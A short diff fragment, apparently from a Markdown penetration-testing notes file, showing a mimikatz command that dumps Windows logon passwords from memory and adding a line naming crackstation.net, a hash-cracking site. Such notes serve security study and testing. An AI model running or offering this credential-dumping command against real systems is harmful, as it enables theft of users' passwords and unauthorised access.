@@ -59,6 +59,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
+crackstation.net
 
 ---
 
